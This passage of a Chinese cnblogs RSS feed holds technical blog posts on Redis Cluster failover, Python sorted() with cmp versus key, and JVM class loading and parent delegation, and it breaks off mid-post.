&lt;p&gt;客户端可以发送读取任一个槽的命令到任一个集群实例，当槽属于请求的实例的时候，就会处理，否则会告诉客户端这个槽在哪里，例如如果将下面命令发到第二个 Master：&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;GET key1
返回： MOVED slot ip:port（第一个Master的） 
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;默认情况下，所有的读写命令&lt;strong&gt;只能发送到 Master&lt;/strong&gt;。如果需要使用 Slave 处理读请求，需要先在客户端执行 &lt;code&gt;readonly&lt;/code&gt; 命令。&lt;/p&gt;
&lt;h2 id=&quot;主从自动切换机制&quot;&gt;主从自动切换机制&lt;/h2&gt;
&lt;p&gt;当一个 Master 发生故障，如果有 Slave，则会切换为 Master。&lt;/p&gt;
&lt;p&gt;如何判断 Master 发生故障了呢？Redis 集群配置中有一个配置，&lt;code&gt;cluster-node-timeout&lt;/code&gt;集群心跳超时时间。当集群内节点建立连接后，定时任务 clusterCron 函数（参考源码：&lt;a href=&quot;https://github.com/redis/redis/blob/6.0/src/cluster.c&quot; target=&quot;_blank&quot;&gt;https://github.com/redis/redis/blob/6.0/src/cluster.c&lt;/a&gt;）会每隔一秒随机选择一个节点发送心跳。如果在超时时间（&lt;code&gt;cluster-node-timeout&lt;/code&gt;）的时间内未收到心跳响应，则将这个节点标记为 pfail。&lt;/p&gt;
&lt;p&gt;如果集群中&lt;strong&gt;有一半以上的 Master&lt;/strong&gt; 标记一个节点的状态是 pfail，那么这个节点的状态就会变成 fail。&lt;/p&gt;
&lt;p&gt;当节点变成 fail 就会触发自动主从切换。主从切换的过程，也涉及到类似的选举：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;当某个 Master 被标记为 fail 之后，对应的 Slave 节点执行定时任务 clusterCron 函数时，选取复制偏移量，也就是主从同步进度最大、数据最新的 Slave 尝试变为主。&lt;/li&gt;
&lt;li&gt;这个 Slave 设置自己的 currentEpoch += 1（正常情况下集群中所有的 currentEpoch 相同，每次选举都会加 1，并且每个 currentEpoch 只能投一次，防止多个 Slave 同时发起选举后难以获取大多数票），之后向所有的 Master 发送 failover 请求，如果得到大多数 Master 的同意则开始执行主从切换。&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;集群不可用情况&quot;&gt;集群不可用情况&lt;/h2&gt;
&lt;p&gt;根据上面的描述，我们可以总结出如下不可用的情况&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;当访问一个 Master 和 Slave 节点都挂了的槽的时候，会报槽无法获取。&lt;/li&gt;
&lt;li&gt;当集群 Master 节点个数小于 3 个的时候，或者集群可用节点个数为偶数的时候，基于 fail 的这种选举机制的自动主从切换过程可能会不能正常工作，一个是标记 fail 的过程，一个是选举新的 master 的过程，都有可能异常。&lt;/li&gt;
&lt;/ol&gt;
&lt;ol&gt;&lt;li&gt;官方文档：&lt;a href=&quot;https://redis.io/topics/cluster-spec&quot; target=&quot;_blank&quot;&gt;https://redis.io/topics/cluster-spec&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;源代码：[&lt;a href=&quot;https://github.com/redis/redis&quot; target=&quot;_blank&quot;&gt;https://github.com/redis/redis&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;strong&gt;每日一刷，轻松提升技术，斩获各种offer：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://zhxhash-blog.oss-cn-beijing.aliyuncs.com/qr-code.jpg&quot; alt=&quot;image&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
</description>
<pubDate>Mon, 01 Feb 2021 18:17:00 +0000</pubDate>
<dc:creator>干货满满张哈希</dc:creator>
<og:description>Redis 集群模式简述 一个集群模式的官方推荐最小最佳实践方案是 6 个节点，3 个 Master 3 个 Slave 的模式，如 图00 所示。 key 分槽与转发机制 Redis 将键空间分为了</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zhxdick/p/14360095.html</dc:identifier>
</item>
<item>
<title>Python 中 sorted 如何自定义比较逻辑 - zikcheng</title>
<link>http://www.cnblogs.com/zikcheng/p/14360071.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/zikcheng/p/14360071.html</guid>
<description>&lt;p&gt;本文主要介绍了如何在 sorted 函数中自定义比较逻辑，Python 2 中可以通过 cmp 或 key 来实现，cmp 接收 2 个参数，通过返回的数值来判断两个参数的大小，key 重新计算一个新的结果参与比较。在 Python 3 中，考虑到 cmp 的性能和冗余的原因，将其移除了。&lt;/p&gt;&lt;div id=&quot;cnblogs_post_body&quot; readability=&quot;168.42175400684&quot;&gt;
&lt;p&gt;在 Python 中对一个可迭代对象进行排序是很常见的一个操作，一般会用到 sorted() 函数&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;num_list = [4, 2, 8, -9, 1, -3]
sorted_num_list = sorted(num_list)
print(sorted_num_list)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的代码是对整数列表 num_list 按从小到大的顺序进行排序，得到的结果如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;[-9, -3, 1, 2, 4, 8]
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有时候不仅仅是对元素本身进行排序，而是在元素值的基础上进行一些计算之后再进行比较，比如将 num_list 中的元素按照其平方值的大小进行排序。&lt;/p&gt;
&lt;p&gt;在 Python 2 中，可以通过 sorted() 函数中的 cmp 或 key 参数来实现这种自定义的比较逻辑。cmp 比较函数接收两个参数 x 和 y（x 和 y 都是列表中元素）并且返回一个数字，如果返回正数表示 x &amp;gt; y，返回 0 表示 x == y，返回负数表示 x &amp;lt; y。key 函数接收一个参数，重新计算出一个结果，然后用计算出的结果参与排序比较。因此在 Python 2 中按平方值大小排序可以有下面两种实现方式&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;num_list = [4, 2, 8, -9, 1, -3]
# cmp 参数只在 Python 2 中存在，Python 3 及之后的版本移除了 cmp 参数
sorted_num_list = sorted(num_list, cmp=lambda x, y: x ** 2 - y ** 2)
sorted_num_list = sorted(num_list, key=lambda x: x ** 2)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;但是随着 Python 3.0 的发布，cmp 参数也随之被移除了，也就是说在 Python 3 中自定义比较逻辑就只能通过 key 参数来实现。至于为什么将 cmp 参数移除，在 Python 的 &lt;a href=&quot;https://bugs.python.org/issue1771&quot; target=&quot;_blank&quot;&gt;Issue tracker&lt;/a&gt; 中有一段很长的讨论，主要有以下两点原因&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;cmp 是一个冗余参数，所有使用 cmp 的场景都可以用 key 来代替&lt;/li&gt;
&lt;li&gt;使用 key 比使用 cmp 的性能更快，对于有 N 个元素的列表，在排序过程中如果调用 cmp 进行比较，那么 cmp 的调用次数为 Nlog(N) 量级（基于比较的排序的最快时间复杂度），如果使用 key 参数，那么只需要在每个元素上调用一次 key 函数，只有 N 次调用，虽然使用 key 参数也要进行 O(Nlog(N)) 量级比较次数，但这些比较是在 C 语言层，比调用用户自定义的函数快。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;关于上面性能的问题，我做了一个实验，分别随机生成 1000、10000、100000 和 1000000 个整数，然后用 key 和 cmp 的方式分别进行排序并记录排序的时间消耗&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import random
import time

counts = (1000, 10000, 100000, 1000000)

def custom_cmp(x, y):
    return x ** 2 - y ** 2

def custom_key(x):
    return x ** 2

print('%7s%20s%20s' % ('count', 'cmp_duration', 'key_duration'))
for count in counts:
    min_num = -count // 2
    max_num = count // 2
    nums = [random.randint(min_num, max_num) for _ in range(count)]
    start = time.time()
    sorted(nums, cmp=custom_cmp)
    cmp_duration = time.time() - start
    start = time.time()
    sorted(nums, key=custom_key)
    key_duration = time.time() - start
    print('%7d%20.2f%20.2f' % (count, cmp_duration, key_duration))
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;在我的笔记本上一次运行结果如下&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  count        cmp_duration        key_duration
   1000                0.00                0.00
  10000                0.02                0.01
 100000                0.34                0.11
1000000                4.75                1.85
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;可以看到，当列表中数字的数量超过 100000 的时候，使用 key 函数的性能优势就非常明显了，比 cmp 快了 2~3 倍。&lt;/p&gt;
&lt;p&gt;对于熟悉 Java 或 C++ 等其他编程语言的同学来说，可能更熟悉 cmp 的比较方式。其实 Python 3 中也可以通过 functools 工具包中的 cmp_to_key() 函数来将 cmp 转换成 key，从而使用接收两个参数的自定义比较函数 cmp。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;import functools

num_list = [4, 2, 8, -9, 1, -3]

def custom_cmp(x, y):
    return x ** 2 - y ** 2

sorted_num_list = sorted(num_list, key=functools.cmp_to_key(custom_cmp))
print(sorted_num_list)
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;那么，cmp_to_key() 函数是如何将 cmp 转换成 key 的呢，我们可以通过&lt;a href=&quot;https://github.com/python/cpython/blob/3.9/Lib/functools.py#L202&quot; target=&quot;_blank&quot;&gt;源码&lt;/a&gt;一探究竟&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-python&quot;&gt;def cmp_to_key(mycmp):
    &quot;&quot;&quot;Convert a cmp= function into a key= function&quot;&quot;&quot;
    class K(object):
        __slots__ = ['obj']
        def __init__(self, obj):
            self.obj = obj
        def __lt__(self, other):
            return mycmp(self.obj, other.obj) &amp;lt; 0
        def __gt__(self, other):
            return mycmp(self.obj, other.obj) &amp;gt; 0
        def __eq__(self, other):
            return mycmp(self.obj, other.obj) == 0
        def __le__(self, other):
            return mycmp(self.obj, other.obj) &amp;lt;= 0
        def __ge__(self, other):
            return mycmp(self.obj, other.obj) &amp;gt;= 0
        __hash__ = None
    return K
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;其实 cmp_to_key() 返回的是一个类 K，只不过在类 K 中重载了各种比较运算符，重载的过程中使用到了自定义的比较函数 mycmp，使得 K 的大小比较逻辑与 mycmp 一致。这样，对于 num_list 中的每个元素 num 都会执行一次 K(num) 生成一个类 K 的实例，然后通过比较不同 K 的实例的大小进行排序。&lt;/p&gt;
&lt;p&gt;虽然通过 cmp_to_key() 可以调用自定义的 cmp 函数，但是还是要优先使用 key 函数，因为通过 cmp_to_key() 方式会在排序过程中创建很多类 K 的实例，对性能有很大影响，下面是 cmp_to_key() 和 key 的性能比较&lt;/p&gt;
&lt;pre&gt;
&lt;code&gt;  count          cmp_to_key        key_duration
   1000                0.01                0.00
  10000                0.10                0.01
 100000                1.36                0.09
1000000               16.89                1.13
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;当 num_list 中的数量为 1000000 的时候 key 比 cmp_to_key 快了将近 15 倍。&lt;/p&gt;
&lt;p&gt;本文主要介绍了如何在 sorted 函数中自定义比较逻辑，Python 2 中可以通过 cmp 或 key 来实现，cmp 接收 2 个参数，通过返回的数值来判断两个参数的大小，key 重新计算一个新的结果参与比较。在 Python 3 中，考虑到 cmp 的性能和冗余的原因，将其移除了。在 Python 3.2 中提供了 functools.cmp_to_key 这个函数来使用自定义的比较函数 cmp，但是出于性能的考虑，我们还是要优先使用 key 来进行排序。&lt;/p&gt;
&lt;/div&gt;</description>
<pubDate>Mon, 01 Feb 2021 17:43:00 +0000</pubDate>
<dc:creator>zikcheng</dc:creator>
<og:description>本文主要介绍了如何在 sorted 函数中自定义比较逻辑，Python 2 中可以通过 cmp 或 key 来实现，cmp 接收 2 个参数，通过返回的数值来判断两个参数的大小，key 重新计算一个新</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/zikcheng/p/14360071.html</dc:identifier>
</item>
<item>
<title>JVM类加载与双亲委派机制被打破 - 等不到的口琴</title>
<link>http://www.cnblogs.com/Courage129/p/14359918.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/Courage129/p/14359918.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;前文已经讲了虚拟机将java文件编译成class文件后的格式:&lt;strong&gt;&lt;a href=&quot;https://www.cnblogs.com/Courage129/p/14358024.html&quot; target=&quot;_blank&quot;&gt;JVM虚拟机Class类文件研究分析&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;java文件经过编译,形成class文件,那么虚拟机如何将这些Class文件读取到内存中呢?&lt;/p&gt;
&lt;h2 id=&quot;加载的时机&quot;&gt;加载的时机&lt;/h2&gt;
&lt;p&gt;JVM 会在程序第一次主动引用类的时候加载该类，被动引用时并不会引发类加载的操作。也就是说，JVM 并不是在一开始就把一个程序就所有的类都加载到内存中，而是到不得不用的时候才把它加载进来，而且只加载一次。&lt;/p&gt;
&lt;p&gt;一个类的生命周期如图所示:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2002319/202102/2002319-20210202000900567-874184851.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;上图中的加载、验证、准备、初始化、卸载这几个步骤是相对固定的,但是初始化这一步不一定,他在某些情况下可以是再初始化之后执行。&lt;/p&gt;
&lt;h2 id=&quot;加载&quot;&gt;加载&lt;/h2&gt;
&lt;p&gt;加载是类加载的第一阶段,虚拟机此时主要做以下三件事情:&lt;/p&gt;
&lt;p&gt;1.通过类的全限定名来获取定义这个类的二进制字节流。&lt;/p&gt;
&lt;p&gt;2.将字节流的静态存储结构转化为运行时的数据结构；&lt;/p&gt;
&lt;p&gt;3.在内存中生成该类的 java.lang.Class 对象,作为方法区这个类各种数据访问入口。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;主动引用一定会加载,但是被动引用则不一定&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;主动引用&quot;&gt;主动引用&lt;/h3&gt;
&lt;ol readability=&quot;2.5&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;遇到 new、getstatic、putstatic、invokestatic 字节码指令，例如：&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;使用 new 实例化对象；&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;读取或设置一个类的 static 字段（被 final 修饰的除外）；&lt;/p&gt;
&lt;p&gt;调用类的静态方法。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;对类进行反射调用；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0.5&quot;&gt;
&lt;p&gt;初始化一个类时，其父类还没初始化（需先初始化父类）；&lt;/p&gt;
&lt;blockquote readability=&quot;6&quot;&gt;
&lt;p&gt;这点类与接口具有不同的表现，接口初始化时，不要求其父接口完成初始化，只有真正使用父接口时才初始化，如引用父接口中定义的常量。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;虚拟机启动，先初始化包含 main() 函数的主类；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;JDK 1.7 动态语言支持：一个 java.lang.invoke.MethodHandle 的解析结果为 REF_getStatic、REF_putStatic、REF_invokeStatic。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;被动引用&quot;&gt;被动引用&lt;/h3&gt;
&lt;ol readability=&quot;0.5&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;通过子类引用父类静态字段，不会导致子类初始化；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;&lt;code&gt;Array[] arr = new Array[10];&lt;/code&gt; 不会触发 Array 类初始化；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;code&gt;static final VAR&lt;/code&gt; 在编译阶段会存入调用类的常量池，通过 &lt;code&gt;ClassName.VAR&lt;/code&gt; 引用不会触发 ClassName 初始化。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;也就是说，只有发生主动引用所列出的 5 种情况，一个类才会被加载到内存中，也就是说类的加载是 lazy-load 的，不到必要时刻是不会提前加载的，毕竟如果将程序运行中永远用不到的类加载进内存，会占用方法区中的内存，浪费系统资源。&lt;/p&gt;
&lt;h2 id=&quot;验证&quot;&gt;验证&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;目的：&lt;/strong&gt; 确保 .class 文件中的字节流信息符合虚拟机的要求。&lt;/p&gt;
&lt;p&gt;4 个验证过程：&lt;/p&gt;
&lt;blockquote readability=&quot;13&quot;&gt;
&lt;p&gt;文件格式验证：是否符合 Class 文件格式规范，验证文件开头 4 个字节是不是 “魔数” &lt;code&gt;0xCAFEBABE&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;元数据验证：保证字节码描述信息符号 Java 规范（语义分析）&lt;/p&gt;
&lt;p&gt;字节码验证：程序语义、逻辑是否正确（通过数据流、控制流分析）&lt;/p&gt;
&lt;p&gt;符号引用验证：对类自身以外的信息（常量池中的符号引用）进行匹配性校验&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这个操作虽然重要，但不是必要的，可以通过 &lt;code&gt;-Xverify:none&lt;/code&gt; 关掉。&lt;/p&gt;
&lt;h2 id=&quot;准备&quot;&gt;准备&lt;/h2&gt;
&lt;ul readability=&quot;7&quot;&gt;&lt;li readability=&quot;0&quot;&gt;
&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; 为 static 变量(类变量,非实例变量)在方法区分配内存。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;14&quot;&gt;
&lt;p&gt;static 变量准备后的初始值：&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当static变量未被final修饰时&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static int value = 123;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;准备后为 0，value 的赋值指令 putstatic 会被放在 &lt;code&gt;()&lt;/code&gt; 方法中，&lt;code&gt;()&lt;/code&gt;方法会在初始化时执行，也就是说，value 变量只有在初始化后才等于 123。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;当static变量被final修饰时&lt;/strong&gt;:&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public static final int value = 123;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;准备后为 123，因为被 &lt;code&gt;static final&lt;/code&gt; 赋值之后 value 就不能再修改了，所以在这里进行了赋值之后，之后不可能再出现赋值操作，所以可以直接在准备阶段就把 value 的值初始化好。&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;解析&quot;&gt;解析&lt;/h2&gt;
&lt;p&gt;描述：将常量池中的 “符号引用” 替换为 “直接引用”,也就是说将引用指向内存。&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;符号引用,比如com.courage.People引用了com.courage.Man,这时候Man并不在内存中&lt;/p&gt;
&lt;p&gt;但是直接饮用则是引用Man所在的内存地址。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;在此之前，常量池中的引用是不一定存在的，解析过之后，可以保证常量池中的引用在内存中一定存在。&lt;/p&gt;
&lt;p&gt;什么是 “符号引用” 和 “直接引用” ？&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;符号引用：以一组符号描述所引用的对象（如对象的全类名），引用的目标不一定存在于内存中。&lt;/li&gt;
&lt;li&gt;直接引用：直接指向被引用目标在内存中的位置的指针等，也就是说，引用的目标一定存在于内存中。&lt;/li&gt;
&lt;/ul&gt;&lt;h2 id=&quot;初始化&quot;&gt;初始化&lt;/h2&gt;
&lt;p&gt;&lt;strong&gt;描述：&lt;/strong&gt; 执行类构造器&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法的过程。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法包含的内容：&lt;/strong&gt;&lt;/p&gt;
&lt;blockquote readability=&quot;7&quot;&gt;
&lt;p&gt;所有 static 的赋值操作；&lt;/p&gt;
&lt;p&gt;static 块中的语句；&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;strong&gt;&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法中的语句顺序：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;基本按照语句在源文件中出现的顺序排列；&lt;/p&gt;
&lt;p&gt;静态语句块只能访问定义在它前面的变量，定义在它后面的变量，可以赋值，但不能访问。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;与实例构造器&lt;code&gt;&amp;lt;init&amp;gt;()&lt;/code&gt;不同的地方在于：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;不需要显示调用父类的&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法；&lt;/p&gt;
&lt;p&gt;虚拟机保证在子类的&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法执行前，父类的&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法一定执行完毕。&lt;/p&gt;
&lt;p&gt;也就是说，父类的 static 块和 static 字段的赋值操作是要先于子类的。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;接口与类的不同&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;执行子接口的&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法前不需要先执行父接口的&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法（除非用到了父接口中定义的 public static final 变量）；&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;执行过程中加锁&lt;/strong&gt;：&lt;/p&gt;
&lt;p&gt;同一时刻只能有一个线程在执行&lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法，因为虚拟机要保证在同一个类加载器下，一个类只被加载一次。&lt;/p&gt;
&lt;p&gt;非必要性：&lt;/p&gt;
&lt;p&gt;一个类如果没有任何 static 的内容就不需要执行 &lt;code&gt;&amp;lt;clinit&amp;gt;()&lt;/code&gt;方法。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;注：初始化时，才真正开始执行类中定义的 Java 代码。&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;虚拟机规范中并没有规定何时加载类,但是以下6种场景,场景必须初始化&lt;/p&gt;
&lt;h2 id=&quot;类的显式加载和隐式加载&quot;&gt;类的显式加载和隐式加载&lt;/h2&gt;
&lt;h3 id=&quot;显示加载&quot;&gt;显示加载&lt;/h3&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;调用 &lt;code&gt;ClassLoader#loadClass(className)&lt;/code&gt; 或 &lt;code&gt;Class.forName(className)&lt;/code&gt;。&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;1.5&quot;&gt;
&lt;p&gt;两种显示加载 .class 文件的区别：&lt;/p&gt;
&lt;blockquote readability=&quot;8&quot;&gt;
&lt;p&gt;&lt;code&gt;Class.forName(className)&lt;/code&gt; 加载 class 的同时会初始化静态域，&lt;code&gt;ClassLoader#loadClass(className)&lt;/code&gt; 不会初始化静态域；&lt;/p&gt;
&lt;p&gt;Class.forName 借助当前调用者的 class 的 ClassLoader 完成 class 的加载。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h3 id=&quot;隐式加载&quot;&gt;隐式加载&lt;/h3&gt;
&lt;ol readability=&quot;-1&quot;&gt;&lt;li&gt;
&lt;p&gt;new 类对象；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;使用类的静态域；&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;创建子类对象；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;-1&quot;&gt;
&lt;p&gt;使用子类的静态域；&lt;/p&gt;
&lt;/li&gt;
&lt;li readability=&quot;2.5&quot;&gt;
&lt;p&gt;其他的隐式加载，在 JVM 启动时&lt;/p&gt;
&lt;blockquote readability=&quot;10&quot;&gt;
&lt;p&gt;BootStrapLoader 会加载一些 JVM 自身运行所需的 Class；&lt;/p&gt;
&lt;p&gt;ExtClassLoader 会加载指定目录下一些特殊的 Class；&lt;/p&gt;
&lt;p&gt;AppClassLoader 会加载 classpath 路径下的 Class，以及 main 函数所在的类的 Class 文件。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;&lt;h2 id=&quot;双亲委派机制&quot;&gt;双亲委派机制&lt;/h2&gt;
&lt;p&gt;通过一个类的全限定名来获取描述该类的二进制字节流这个动作在Java虚拟机外部实现，这样做的好处是应用程序自己决定如何去获取所需的类。实现这个动作的代码被称为“类加载器”（Class Loader）。&lt;/p&gt;
&lt;p&gt;在比较两个类是不是同一个类,只有在同一个类加载器下比较才有意义,对于同一个类用不同的加载器加载内存,两个类是不相等的。&lt;/p&gt;
&lt;p&gt;站在Java虚拟机的角度来看，只存在两种不同的类加载器：一种是启动类加载器（Bootstrap ClassLoader），这个类加载器使用C++语言实现 ，是虚拟机自身的一部分；另外一种就是其他所有的类加载器，这些类加载器都由Java语言实现，独立存在于虚拟机外部，并且全都继承自抽象类java.lang.ClassLoader。&lt;/p&gt;
&lt;p&gt;为了保证加载应该被加载的类,遵循双亲委派机制,目的是保证安全性,例如自己定义的String类不至于替换掉虚拟机默认的String类,双亲委派机制如图:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/blog/2002319/202102/2002319-20210202000916898-1031650726.png&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;需要说明的是,此处的Cache以及仓库是我为了后面说明方便而做的定义,每一个启动器都有自己对应的Class文件存放位置,将这个位置称之为仓库,已经加载进内存的Class存放在内存中,这块内存称之为Cache,对于我们自定义的String类,肯定是放在用户空间的仓库上,如果要加载这个类,会依次往上查找,各级的内存,首先查找用户自定义的ClassLoader,如果已经加载过就直接返回,如果没有加载过就往上一类加载器缓存中查找,如果直到Bootstrap都没有找到的话就会开始查找仓库,查找仓库的顺序与查找缓存相反,先查找Bootstrap的仓库,再查找Extension,找到就加载然后返回Class,也就意味着,自定义的String根本没法被查找到,因为在Bootstrap仓库中已经查找到String并且加载返回了。&lt;/p&gt;
&lt;p&gt;双亲委派模型要求除了顶层的启动类加载器外，其余的类加载器都应有自己的父类加载器。不过这里类加载器之间的父子关系一般不是以继承（Inheritance）的关系来实现的，而是通常使用组合（Composition）关系来复用父加载器的代码。&lt;/p&gt;
&lt;p&gt;使用双亲委派模型来组织类加载器之间的关系，一个显而易见的好处就是Java中的类随着它的类加载器一起具备了一种带有优先级的层次关系。例如类java.lang.Object，它存放在rt.jar之中，无论哪一个类加载器要加载这个类，最终都是委派给处于模型最顶端的启动类加载器进行加载，因此Object类在程序的各种类加载器环境中都能够保证是同一个类。&lt;/p&gt;
&lt;h2 id=&quot;双亲委派机制被破坏&quot;&gt;双亲委派机制被破坏&lt;/h2&gt;
&lt;p&gt;在Java的世界中大部分的类加载器都遵循这个模型，但也有例外的情况，直到Java模块化出现为止，双亲委派模型主要出现过3次较大规模“被破坏”的情况。&lt;/p&gt;
&lt;h3 id=&quot;第一次被破坏&quot;&gt;第一次被破坏&lt;/h3&gt;
&lt;p&gt;双亲委派模型的第一次“被破坏”其实发生在双亲委派模型出现之前——即JDK 1.2面世以前的“远古”时代。由于双亲委派模型在JDK 1.2之后才被引入，但是类加载器的概念和抽象类java.lang.ClassLoader则在Java的第一个版本中就已经存在，面对已经存在的用户自定义类加载器的代码，Java设计者们引入双亲委派模型时不得不做出一些妥协，为了兼容这些已有代码，无法再以技术手段避免loadClass()被子类覆盖的可能性，只能在JDK 1.2之后的java.lang.ClassLoader中添加一个新的protected方法findClass()，并引导用户编写的类加载逻辑时尽可能去重写这个方法，而不是在loadClass()中编写代码。上节我们已经分析过loadClass()方法，双亲委派的具体逻辑就实现在这里面，按照loadClass()方法的逻辑，如果父类加载失败，会自动调用自己的findClass()方法来完成加载，这样既不影响用户按照自己的意愿去加载类，又可以保证新写出来的类加载器是符合双亲委派规则的。&lt;/p&gt;
&lt;h3 id=&quot;第二次被破坏&quot;&gt;第二次被破坏&lt;/h3&gt;
&lt;p&gt;双亲委派模型的第二次“被破坏”是由这个模型自身的缺陷导致的，双亲委派很好地解决了各个类加载器协作时基础类型的一致性问题（越基础的类由越上层的加载器进行加载），基础类型之所以被称为“基础”，是因为它们总是作为被用户代码继承、调用的API存在，但程序设计往往没有绝对不变的完美规则，如果有基础类型又要调用回用户的代码，那该怎么办呢？&lt;/p&gt;
&lt;p&gt;这并非是不可能出现的事情，一个典型的例子便是JNDI服务，JNDI现在已经是Java的标准服务，它的代码由启动类加载器来完成加载（在JDK 1.3时加入到rt.jar的），肯定属于Java中很基础的类型了。但JNDI存在的目的就是对资源进行查找和集中管理，它需要调用由其他厂商实现并部署在应用程序的ClassPath下的JNDI服务提供者接口（Service Provider Interface，SPI）的代码，现在问题来了，启动类加载器是绝不可能认识、加载这些代码的，那该怎么办？&lt;/p&gt;
